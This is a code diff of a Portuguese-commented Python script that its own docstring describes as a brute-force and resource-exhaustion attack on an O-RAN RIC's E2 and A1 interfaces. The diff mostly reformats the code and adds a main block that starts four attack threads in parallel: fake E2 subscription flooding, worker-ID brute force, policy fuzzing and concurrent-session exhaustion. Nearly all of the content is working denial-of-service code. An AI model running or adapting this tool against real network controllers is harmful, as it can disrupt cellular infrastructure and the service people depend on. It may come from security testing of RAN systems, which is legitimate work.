@@ -1,12 +1,13 @@
+#!/usr/bin/env python3
 """
 ataque_forca_bruta.py - Ataque de Força Bruta / Exaustão de Recursos para O-RAN
 Alvo: Interface E2 (POST) e Interface A1 (PUT) do RIC
 
 Técnicas:
-    1. E2 Subscription Flood (xApp) - inunda RMR com subscrições E2 falsas
-    2. Worker ID Brute Force (xApp) - exaustão de espaço de IDs de workers
-    3. Policy Parameter Fuzzing (rApp) - milhões de combinações de políticas
-    4. Concurrent Session Exhaustion (xApp+rApp) - esgota handlers concorrentes
+  1. E2 Subscription Flood (xApp) - inunda RMR com subscrições E2 falsas
+  2. Worker ID Brute Force (xApp) - exaustão de espaço de IDs de workers
+  3. Policy Parameter Fuzzing (rApp) - milhões de combinações de políticas
+  4. Concurrent Session Exhaustion (xApp+rApp) - esgota handlers concorrentes
 """
 
 import threading
@@ -49,10 +50,9 @@ def tecnica1_subscription_flood():
                 data = json.dumps(e2_sub).encode()
                 req = urllib.request.Request(BASE_URL, data=data, method="POST")
                 req.add_header('Content-Type', 'application/json')
-                with urllib.request.urlopen(req, timeout=1): 
-                    pass
-
-                time.sleep(0.5) # Aproximadamente subscricoes/s
+                with urllib.request.urlopen(req, timeout=1): pass
+            
+            time.sleep(0.5)  # ~40 subscricoes/s
         except Exception as e:
             time.sleep(0.5)
 
@@ -76,10 +76,9 @@ def tecnica2_worker_id_bruteforce():
                 data = json.dumps(worker).encode()
                 req = urllib.request.Request(BASE_URL, data=data, method="POST")
                 req.add_header('Content-Type', 'application/json')
-                with urllib.request.urlopen(req, timeout=1): 
-                    pass
-
-                time.sleep(0.3)
+                with urllib.request.urlopen(req, timeout=1): pass
+            
+            time.sleep(0.3)
         except Exception as e:
             print(f"[BF-T2:WorkerID] Erro: {e}")
             time.sleep(0.5)
@@ -96,7 +95,7 @@ def tecnica3_policy_fuzzing():
         "INTERFERENCE", "EMERGENCY", "MAINTENANCE", "TEST",
         "OPTIMIZATION", "RECONFIG", "SCALE_UP", "SCALE_DOWN"
     ]
-
+    
     while True:
         try:
             for _ in range(10):
@@ -114,9 +113,8 @@ def tecnica3_policy_fuzzing():
                 data = json.dumps(policy).encode()
                 req = urllib.request.Request(BASE_URL, data=data, method="PUT")
                 req.add_header('Content-Type', 'application/json')
-                with urllib.request.urlopen(req, timeout=1): 
-                    pass
-
+                with urllib.request.urlopen(req, timeout=1): pass
+            
             time.sleep(0.2)
         except Exception as e:
             print(f"[BF-T3:Fuzzing] Erro: {e}")
@@ -128,7 +126,7 @@ def tecnica3_policy_fuzzing():
 def tecnica4_concurrent_exhaustion():
     """Esgota handlers concorrentes do servidor RIC"""
     time.sleep(9)
-
+    
     def requisicao_rapida():
         try:
             payload = {
@@ -140,11 +138,10 @@ def tecnica4_concurrent_exhaustion():
             data = json.dumps(payload).encode()
             req = urllib.request.Request(BASE_URL, data=data, method="POST")
             req.add_header('Content-Type', 'application/json')
-            with urllib.request.urlopen(req, timeout=0.5): 
-                pass
+            with urllib.request.urlopen(req, timeout=0.5): pass
         except:
             pass
-
+    
     while True:
         try:
             threads = []
@@ -152,11 +149,41 @@ def tecnica4_concurrent_exhaustion():
                 t = threading.Thread(target=requisicao_rapida, daemon=True)
                 t.start()
                 threads.append(t)
-
+            
             for t in threads:
                 t.join(timeout=0.3)
-
+            
             time.sleep(0.2)
         except Exception as e:
             print(f"[BF-T4:Exhaust] Erro: {e}")
             time.sleep(0.5)
+
+# ============================================================
+# MAIN
+# ============================================================
+if __name__ == "__main__":
+    print("\n[!] INICIANDO ATAQUE DE FORCA BRUTA / EXAUSTAO\n")
+    
+    tecnicas = [
+        ("E2 Subscription Flood (xApp)", tecnica1_subscription_flood),
+        ("Worker ID Brute Force (xApp)", tecnica2_worker_id_bruteforce),
+        ("Policy Parameter Fuzzing (rApp)", tecnica3_policy_fuzzing),
+        ("Concurrent Session Exhaustion (ambos)", tecnica4_concurrent_exhaustion),
+    ]
+    
+    threads = []
+    for nome, func in tecnicas:
+        t = threading.Thread(target=func, daemon=True)
+        t.start()
+        threads.append(t)
+        print(f"  [OK] {nome}")
+    
+    print(f"\n[+] {len(threads)} threads rodando em paralelo")
+    print("[+] Pressione Ctrl+C para parar\n")
+    
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n[!] Ataque interrompido pelo operador")
+        sys.exit(0)
